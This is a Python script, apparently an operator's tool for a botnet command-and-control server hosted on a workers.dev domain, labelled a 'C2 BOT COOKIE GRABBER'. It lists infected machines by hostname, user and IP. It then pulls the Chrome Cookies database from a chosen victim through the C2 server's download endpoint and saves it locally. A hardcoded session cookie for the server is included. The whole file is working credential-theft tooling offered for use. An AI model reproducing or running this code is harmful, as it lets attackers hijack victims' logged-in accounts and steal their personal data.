import requests
import json
import os
import base64
from colorama import init, Fore, Style

init(autoreset=True)

SERVER = "https://promal.aymenlinux.workers.dev"
SESSION = "34929f53-0f98-43a0-a56e-49e7ef501acc"

HEADERS = {
    "Host": "promal.aymenlinux.workers.dev",
    "Cookie": f"session={SESSION}",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "application/json",
    "Origin": SERVER,
    "Referer": f"{SERVER}/folderz",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:159.0) Gecko/20100101 Firefox/159.0",
}

CHROME_COOKIES_PATH = r"C:\Users\aymen\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"


def banner():
    print(Fore.CYAN + Style.BRIGHT + "=" * 60)
    print(Fore.CYAN + Style.BRIGHT + "  C2 BOT COOKIE GRABBER")
    print(Fore.CYAN + Style.BRIGHT + "=" * 60)
    print()


def get_bots():
    try:
        r = requests.get(f"{SERVER}/api/all_bots", headers=HEADERS, timeout=15)
        if r.status_code == 200:
            return r.json()
        print(Fore.RED + f"[!] HTTP {r.status_code}")
        return []
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
        return []


def print_bots(bots):
    if not bots:
        print(Fore.YELLOW + "[!] No bots found")
        return

    for i, b in enumerate(bots, 1):
        online = b.get("isOnline", False)
        color = Fore.GREEN if online else Fore.RED
        hostname = b.get("hostname", "?")
        user = b.get("user", "?")
        ip = b.get("ip", "?")

        print(f"{color}{Style.BRIGHT}{i}.{Style.RESET_ALL} "
              f"{Fore.WHITE}Hostname : {color}{hostname}{Style.RESET_ALL}  "
              f"{Fore.WHITE}| User : {color}{user}{Style.RESET_ALL}  "
              f"{Fore.WHITE}| IP : {color}{ip}{Style.RESET_ALL}")
    print()


def download_file(bot_id, remote_path, save_as):
    """
    السيرفر كيرجع: {"status":"ok","b64":"<base64>"}
    كناخدو b64، كنفكّوه، وكنكتبوه فـ الملف.
    """
    try:
        r = requests.post(
            f"{SERVER}/api/download_file",
            headers=HEADERS,
            json={"id": bot_id, "path": remote_path},
            timeout=60,
        )
        if r.status_code != 200:
            return False, f"HTTP {r.status_code}"

        try:
            data = r.json()
        except Exception:
            return False, "invalid JSON"

        if data.get("status") != "ok":
            return False, f"server: {data.get('status')}"

        b64 = data.get("b64")
        if not b64:
            return False, "no b64 in response"

        # فك base64
        try:
            raw = base64.b64decode(b64)
        except Exception as e:
            return False, f"b64 decode: {e}"

        # كتب الملف
        with open(save_as, "wb") as f:
            f.write(raw)

        return True, len(raw)

    except Exception as e:
        return False, str(e)


def main():
    banner()

    print(Fore.BLUE + "[*] Fetching bots...")
    print()
    bots = get_bots()
    print_bots(bots)

    if not bots:
        return

    choice = input(Fore.CYAN + "[?] " + Fore.WHITE + "Select bot number: " + Fore.YELLOW).strip()

    if not choice.isdigit() or not (1 <= int(choice) <= len(bots)):
        print(Fore.RED + "[!] Invalid selection")
        return

    bot = bots[int(choice) - 1]
    bot_id = bot.get("id")
    hostname = bot.get("hostname", "?")
    user = bot.get("user", "?")
    ip = bot.get("ip", "?")

    print(Fore.GREEN + f"[+] Selected: {hostname} | {user} | {ip}")
    print()

    default_name = f"{hostname}_{user}_cookies.db"
    filename = input(
        Fore.CYAN + "[?] " + Fore.WHITE + f"Save as (default: {default_name}): " + Fore.YELLOW
    ).strip()
    if not filename:
        filename = default_name
    if not os.path.splitext(filename)[1]:
        filename += ".db"

    print()
    print(Fore.BLUE + f"[*] Downloading cookies from {bot_id}...")

    ok, info = download_file(bot_id, CHROME_COOKIES_PATH, filename)

    if ok:
        print(Fore.GREEN + Style.BRIGHT + f"[✓] Downloaded {info} bytes")
        print(Fore.GREEN + f"[✓] Saved: {Fore.YELLOW}{os.path.abspath(filename)}")
    else:
        print(Fore.RED + f"[!] Failed: {info}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        print(Fore.YELLOW + "[!] Cancelled")